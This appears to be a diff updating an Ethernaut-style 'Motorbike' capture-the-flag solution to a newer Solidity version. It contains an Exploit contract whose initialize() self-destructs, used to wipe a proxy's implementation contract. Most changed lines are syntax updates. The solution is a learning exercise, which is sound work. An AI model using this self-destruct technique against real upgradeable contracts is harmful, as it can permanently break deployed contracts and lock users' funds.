@@ -1,8 +1,8 @@
 // SPDX-License-Identifier: MIT
 
-pragma solidity <0.7.0;
+pragma solidity 0.8.37;
 
-import "openzeppelin-contracts-06/utils/Address.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
 
 contract MotorbikeAttack {
 
@@ -10,7 +10,7 @@ contract MotorbikeAttack {
     address public implementation;
     event Check(bool result);
 
-    constructor(address impl) public {
+    constructor(address impl) {
         implementation = impl;
     }
 
@@ -34,7 +34,7 @@ contract MotorbikeAttack {
     }
 
     function validateItIsBroken() external {
-        emit Check(Address.isContract(implementation));
+        emit Check(implementation.code.length > 0);
     }
     
 }
@@ -42,6 +42,6 @@ contract MotorbikeAttack {
 contract Exploit {
 
     function initialize() external {
-        selfdestruct(msg.sender);
+        selfdestruct(payable(msg.sender));
     }
 }
